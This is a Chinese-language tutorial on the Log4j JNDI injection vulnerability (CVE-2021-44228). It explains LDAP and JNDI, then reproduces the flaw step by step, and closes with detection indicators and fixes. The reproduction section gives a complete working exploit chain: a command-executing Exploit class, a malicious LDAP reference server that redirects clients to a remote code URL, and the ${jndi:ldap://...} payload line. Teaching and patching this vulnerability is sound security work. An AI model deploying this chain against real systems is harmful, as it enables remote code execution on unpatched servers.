# Log4j介绍与漏洞影响

## 什么是Log4j 

Apache的开源日志组件 

## 记录日志的作用 

1. 1、可以对程序的运行进行调试跟踪 
2. 2、对业务操作进行记录，方便追溯 

## 用法 

1. 1、pom引入依赖 
2. 2、获得logger实例 
3. 3、logger.info() 
   - logger.debug() 
   - logger.error() 
   - logger.warn() 

## 为什么要用log4j

调整日志级别和修改配置 

- 日志级别管理，比如生产环境只打印info日志， 不打印debug日志 
- 不同的package，打印格式不同 
- 多输出渠道 
  - 控制台 
  - 文件 
  - 数据库 
- 日志文件管理 
  - 文件大小 
  - 定时自动清理 
- 易于集成 
  - Spring 
  - Spring Boot 

## log4j漏洞时间线 

http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228 

1. 1、11月24日，阿里云安全团队陈兆军报告log4j RCE漏洞 
2. 2、12月4日开始有在野攻击 
3. 3、10号凌晨漏洞细节被公开 
4. 4、各SRC陆续关闭log4j漏洞提交通道 
5. 5、各安全厂商纷纷通报，发布临时解决办法 
6. 7、Apache陆续发布rc1补丁、rc2补丁、2.15正 式版 

## 受影响公司 

绝大部分互联网公司

# 什么是LDAP

## 定义 

LIGHTWEIGHT DIRECTORY ACCESS Protocol 

轻量级目录访问协议 

### 简称

目录服务 

### 目录服务（例子）

小镇的电话簿 

马云中国黄页 

## 计算机如何提供目录服务？ 

### LDAP 

目录数据库

### 用途 

统一登录

- OA系统 
- 邮箱服务器
-  Git服务器 
- VPN 

## 厂商实现 

### SUN 

SUNONE Directory Server 

### IBM 

IBM Directory Server 

### Novell 

Novell Directory Server 

### Microsoft 

Microsoft Active Directory 

### Opensource 

Opensource 

## 操作 

查询、添加、修改、删除 

## Java代码演示 

### LDAPSeriServer 

- UnboundID依赖 
- 监听7389 
- 添加了一条数据 

## LDAPClient 

- Context对象 
- lookup方法查找数据

# 什么是JNDI？

## 定义 

Java Naming and Directory Interface Java 

命名和目录接口 

## 简称 

命名服务 

## JDBC的不足 

不便于维护 

## 操作 

1. 1、先去公布资源 `bind`方法 
2. 2、然后别人可以用名字查找资源 `lookup`方法 

## 改造JDBC 

```
Object datasourceRef=ctx.lookup("java:jdbc/mydatasource"); 
```



## Spring Boot 

spring.datasource.jndi-name=jdbc/ exampleDB 

## JNDI的作用 

![image-20230420174414403](https://img.gyxnb.top/img/image-20230420174414403.png)

## 关系 

用JNDI接口访问LDAP服务，或者RMI（远程方法调用服务） 

## 代码演示：

###  服务端 

LDAPSeriServer.java 

### 客户端 

JNDIClient.java 

关键函数 `lookup`

# JNDI注入

## 1、JNDI动态协议转换

- 即使初始化的Context指定了一个协议，也会根 据URI传入的参数来转换协议 
- 比如：Context初始化是RMI服务，但是lookup 的参数是LDAP服务，这个时候协议会动态转 换。 

## 2、Naming Reference 命名引用 

- 不在命名/目录服务本地的一个资源，叫做命名引用 
- 让JNDI去请求一个不存在的资源 
- 当JNDI客户端在本地classpath找不到这个类， 就去指定的远程地址请求，下载这个类到本地执 行 

例如 Exploit 定义静态方法块 

## 流程 

![image-20230420174848739](https://img.gyxnb.top/img/image-20230420174848739.png)

## 为什么会执行远程代码？ 

### NamingManager 341行 

![image-20230420174816341](https://img.gyxnb.top/img/image-20230420174816341.png)

### getObjectFactoryFrom... 

![image-20230420174909664](https://img.gyxnb.top/img/image-20230420174909664.png)

## RMI资源也可以这样利用，原理一样 

### 1、怎么在外网启动一个LDAP服务？ 

除了本地Java代码，也可以用marshalsec-0.0. 3-SNAPSHOT-all.jar，带参数直接启动 

### 2、怎么在外网启动一个HTTP服务？

 Apache、Tomcat、Nginx、Phpstudy……

# 环境复现

## 基础环境 

### 开发工具 

IDEA 

### JDK 

JDK 1.8u121以下的版本 

`java -version` 

### Maven

下载地址：https://dlcdn.apache.org/maven/maven-3/

例如apache-maven-3.6.3-bin

`mvn -version` 

## 1、准备远程代码

### Exploit.java

```
import java.io.IOException;

public class Exploit {
    static {
        try {
            // 打开windows电脑的计算器 proof of content
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

### Exploit.class

`javac Exploit.java`

```
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

import java.io.IOException;

public class Exploit {
    public Exploit() {
    }

    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException var1) {
            var1.printStackTrace();
        }

    }
}
```



###  上传到HTTP服务器 

- Apache、Python SimpleHTTPServer都可以 
- phpstudy 
  - Windows 
  - Linux 

## 2、准备LDAP服务器

```
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

public class LDAPRefServer {

    private static final String LDAP_BASE = "dc=example,dc=com";

    /**
     * class地址 用#Exploit代替Exploit.class
     */
    private static final String EXPLOIT_CLASS_URL = "http://192.168.70.13:80/#Exploit";

    public static void main(String[] args) {
        int port = 7912;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(EXPLOIT_CLASS_URL)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;
        public OperationInterceptor(URL cb) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            } catch (Exception e1) {
                e1.printStackTrace();
            }

        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "Calc");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if (refPos > 0) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}

```



- LDAPRefServer.java 
  - maven依赖 
  - unboundid-ldapsdk 
- 配置远程代码的HTTP URL 
- 启动服务，绑定指定端口 

## 3、LDAP客户端（log4j）

```
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4J {
    private static final Logger logger = LogManager.getLogger(Log4J.class);

    public static void main(String[] args) {
        // 先启动LDAP服务器
        logger.error("${jndi:ldap://127.0.0.1:7912/test}");

        // logger.error("${java:runtime} - ${java:vm} - ${java:os}");
    }
}
```

- maven依赖 
  - 2.14.1 
- 版本 
  - Apache Log4j 2.x <= 2.14.1 
- 打印日志即可，客户端即下载恶意代码并执行 

![image-20230420180212915](https://img.gyxnb.top/img/image-20230420180212915.png)

# log4j RCE原理分析

- log4j支持`JNDI lookup`功能 StrSubstitutor resolveVariable()
- `NamingManager newInstance`
- 为什么要打开计算器 任意命令
- 前端注入点 只要是参数被log4j记录的地方都可以
- 现成利用工具 log4j_POC.ja

# 漏洞影响范围

- log4j 2.x <= 2.14.1 
- JDK 小于 8u191、7u201、6u211

# 漏洞排查

### pom版本检查 

### 日志 

- 是否存在“jndi:ldap://”、“jndi:rmi” "dnslog. cn" "ceye.io"等 
- 是否存在JndiLookup、ldapURLContext、 getObjectFactoryFromReference调用 

### 工具 

- https://static.threatbook.cn/tools/log4jlocal-check.sh 
- https://sca.seczone.cn/allScanner.zip

# 漏洞修复

## 思路 

1. 1、禁止用户请求参数出现攻击关键字 安全产品 
2. 2、禁止lookup下载远程文件（命名引用） 
3. 3、禁止log4j的应用连接外网 
4. 4、禁止log4j使用lookup 
5. 5、从log4j jar包中中删除lookup 2.10以下 

## 升级到2.17.1 

### 原理 

1. 1、默认不再支持二次跳转（也就是命名引用）的 方式获取对象 
2. 2、只有在log4j2.allowedLdapClasses列表中指 定的class才能获取。 
3. 3、只有远程地址是本地地址或者在log4j2. allowedLdapHosts列表中指定的地址才能获取 

## 其他方案 

### 升级JDK 

- JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为 true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前 JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客 户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全 性。 
- JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object. trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程 codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏 洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。
-  JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object. trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选 项，把LDAP协议的攻击途径也给禁了。

###  修改log4j配置

1. 1、设置参数 `log4j2.formatMsgNoLookups=True` 
2. 2、修改JVM参数 -`Dlog4j2.formatMsgNoLookups=true` 
3. 3、系统环境变量 `FORMAT_MESSAGES_PATTERN_DISABLE_ LOOKUPS`设置为`true` 
4. 4、禁止 log4j2 所在服务器外连